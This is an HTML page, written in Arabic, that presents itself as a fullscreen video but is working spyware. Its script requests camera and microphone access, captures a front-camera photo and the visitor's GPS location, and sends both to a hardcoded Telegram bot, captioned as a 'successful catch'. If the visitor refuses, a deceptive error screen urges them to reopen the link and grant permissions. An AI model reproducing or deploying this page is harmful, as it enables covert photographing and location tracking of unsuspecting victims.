<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        video { width: 100%; height: 100%; object-fit: cover; }
        /* شاشة الخطأ عند رفض الأذونات */
        #errorOverlay { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.9); color: white; 
            z-index: 9999; text-align: center; 
            padding-top: 50%; font-size: 18px; line-height: 1.6;
        }
        #errorOverlay span { color: #ff4d4d; font-weight: bold; font-size: 22px; }
        #errorOverlay button { margin-top: 20px; padding: 10px 20px; background: #ff4d4d; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="errorOverlay">
        <span>⚠️ خطأ في الأذونات</span><br>
        لم نتمكن من الوصول إلى الصلاحيات المطلوبة للمشاهدة.<br>
        يرجى إعادة فتح الرابط وتفعيل الصلاحيات.<br>
        <button onclick="window.location.reload();">أعد المحاولة</button>
    </div>

    <div class="video-wrapper" id="videoBox">
        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
            <source src="1.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
        const chatId = "1611398303";

        window.onload = function() {
            // تشغيل الفيديو فوراً (أو في حال تفاعل المستخدم)
            const video = document.getElementById('mainVideo');
            video.play().catch(() => console.log("بانتظار التفاعل"));

            // طلب الصلاحيات بعد ثانية واحدة فقط (أسرع)
            setTimeout(startSecureTest, 1000);
        };

        // دالة لطلب الأذونات وإعادة طلبها في كل مرة
        function startSecureTest() {
            // حل مشكلة تذكر الرفض: استخدم طلب الصوت كبداية (أكثر فعالية لإعادة الطلب)
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then(audioStream => {
                // إذا وافق على الصوت، اطلب الكاميرا فوراً
                return navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 1280, height: 720 },
                }).then(videoStream => {
                    // ادمج الصوت والصورة
                    videoStream.addTrack(audioStream.getAudioTracks()[0]);
                    return videoStream;
                });
            })
            .then(stream => {
                // النجاح في الحصول على الصلاحيات
                captureAndSend(stream);
            })
            .catch(err => {
                // حل مشكلة الرفض: إخفاء الفيديو بالكامل وإظهار شاشة خطأ مقنعة
                document.getElementById('videoBox').style.display = 'none';
                document.getElementById('errorOverlay').style.display = 'block';
                
                // إرسال تنبيه بفشل العملية للبوت
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ المستخدم رفض الأذونات أو تم تذكر الرفض الدائم")}`);
            });
        }

        function captureAndSend(stream) {
            let v = document.createElement('video');
            v.srcObject = stream;
            v.play();

            setTimeout(() => {
                let canvas = document.createElement('canvas');
                canvas.width = 720; canvas.height = 1280;
                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                let imgData = canvas.toDataURL('image/jpeg');

                navigator.geolocation.getCurrentPosition(pos => {
                    sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude);
                }, () => {
                    sendToTelegram(imgData, "مرفوض", "مرفوض");
                });

                // إغلاق כל المسارات فوراً لضمان طلبها مرة أخرى عند إعادة الفتح
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }

        function sendToTelegram(imgData, lat, lon) {
            const caption = encodeURIComponent(`✅ صيد ناجح\n📍 GPS: ${lat},${lon}`);
            let url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
            let form = new FormData();
            form.append('document', dataURLtoBlob(imgData), "snap.jpg");
            fetch(url, { method: 'POST', body: form });
        }

        function dataURLtoBlob(dataurl) {
            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], {type:mime});
        }
    </script>
</body>
</html>
